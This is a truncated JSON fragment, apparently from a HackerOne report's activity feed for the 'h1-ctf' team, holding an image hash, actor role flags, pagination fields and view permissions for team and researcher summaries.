a07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}